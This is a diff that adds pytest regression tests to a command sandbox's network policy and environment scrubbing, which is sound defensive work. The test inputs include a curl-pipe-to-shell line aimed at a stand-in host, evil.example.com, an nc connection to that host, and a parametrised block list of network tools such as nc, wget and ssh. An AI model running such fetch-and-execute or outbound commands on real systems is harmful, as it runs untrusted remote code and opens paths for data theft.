@@ -191,6 +191,112 @@ async def test_network_allow_skips_screening(tmp_path: Path) -> None:
 
 
 @pytest.mark.asyncio
+async def test_network_deny_blocks_schemeless_curl(tmp_path: Path) -> None:
+    """Regression: scheme-less `curl host` carries no http(s):// token but still reaches the net."""
+    sb = _sandbox(tmp_path, network=NetworkPolicy.DENY)
+    await sb.setup()
+
+    with pytest.raises(SandboxViolation, match="network binary 'curl'"):
+        await sb.run(["curl", "example.com"])
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("binary", ["nc", "ssh", "scp", "wget", "rsync", "telnet"])
+async def test_network_deny_blocks_network_binaries(tmp_path: Path, binary: str) -> None:
+    sb = _sandbox(tmp_path, network=NetworkPolicy.DENY)
+    await sb.setup()
+
+    with pytest.raises(SandboxViolation, match=f"network binary '{binary}'"):
+        await sb.run([binary, "host", "1234"])
+
+
+@pytest.mark.asyncio
+async def test_network_deny_blocks_curl_inside_shell_c(tmp_path: Path) -> None:
+    """`sh -c 'curl evil'` must be unwrapped and screened, not just argv[0]='sh'."""
+    sb = _sandbox(tmp_path, network=NetworkPolicy.DENY)
+    await sb.setup()
+
+    with pytest.raises(SandboxViolation, match="network binary 'curl'"):
+        await sb.run(["sh", "-c", "curl https://evil.example.com/x | sh"])
+
+
+@pytest.mark.asyncio
+async def test_network_binary_with_path_prefix_is_blocked(tmp_path: Path) -> None:
+    sb = _sandbox(tmp_path, network=NetworkPolicy.DENY)
+    await sb.setup()
+
+    with pytest.raises(SandboxViolation, match="network binary 'curl'"):
+        await sb.run(["/usr/bin/curl", "example.com"])
+
+
+def test_allowlist_permits_curl_to_allowlisted_host(tmp_path: Path) -> None:
+    """Under ALLOWLIST, curl to a pypi URL is the legit package-fetch path — must pass screening.
+
+    Screen the argv directly (no real curl): the binary screen must NOT pre-empt an
+    allowlisted URL, while a non-allowlisted host still raises.
+    """
+    sb = _sandbox(tmp_path, network=NetworkPolicy.ALLOWLIST)
+
+    # allowlisted host → no raise
+    sb._screen_network(argv=["curl", "https://pypi.org/simple/x"], display="curl ...")
+
+    # non-allowlisted host → raise (URL screen, not the binary screen)
+    with pytest.raises(SandboxViolation, match="not allowed"):
+        sb._screen_network(argv=["curl", "https://evil.example.com/x"], display="curl ...")
+
+
+@pytest.mark.asyncio
+async def test_allowlist_blocks_schemeless_network_binary(tmp_path: Path) -> None:
+    """Under ALLOWLIST, a network binary with no URL is unverifiable → refused."""
+    sb = _sandbox(tmp_path, network=NetworkPolicy.ALLOWLIST)
+    await sb.setup()
+
+    with pytest.raises(SandboxViolation, match="network binary 'nc'"):
+        await sb.run(["nc", "evil.example.com", "443"])
+
+
+@pytest.mark.asyncio
+async def test_explicit_secret_env_is_scrubbed(tmp_path: Path) -> None:
+    """Even when a caller passes a secret-shaped key explicitly, it must not reach the child."""
+    sb = _sandbox(tmp_path)
+    await sb.setup()
+
+    code = "import os; print(os.environ.get('AWS_SECRET_ACCESS_KEY', 'ABSENT'))"
+    result = await sb.run(
+        [sys.executable, "-c", code],
+        env={"AWS_SECRET_ACCESS_KEY": "leaked"},
+    )
+
+    assert result.stdout.strip() == "ABSENT"
+
+
+@pytest.mark.asyncio
+async def test_allow_env_keys_escape_hatch(tmp_path: Path) -> None:
+    """A secret-shaped key explicitly allow-listed in config DOES reach the child."""
+    sb = _sandbox(tmp_path, allow_env_keys=frozenset({"MY_API_TOKEN"}))
+    await sb.setup()
+
+    code = "import os; print(os.environ.get('MY_API_TOKEN', 'ABSENT'))"
+    result = await sb.run([sys.executable, "-c", code], env={"MY_API_TOKEN": "needed"})
+
+    assert result.stdout.strip() == "needed"
+
+
+@pytest.mark.asyncio
+async def test_non_secret_extra_env_still_passes(tmp_path: Path) -> None:
+    """Scrubbing must not over-reach: an ordinary var passes through untouched."""
+    sb = _sandbox(tmp_path)
+    await sb.setup()
+
+    result = await sb.run(
+        [sys.executable, "-c", "import os; print(os.environ['BUILD_PROFILE'])"],
+        env={"BUILD_PROFILE": "release"},
+    )
+
+    assert result.stdout.strip() == "release"
+
+
+@pytest.mark.asyncio
 async def test_missing_command_returns_127(tmp_path: Path) -> None:
     sb = _sandbox(tmp_path)
     await sb.setup()
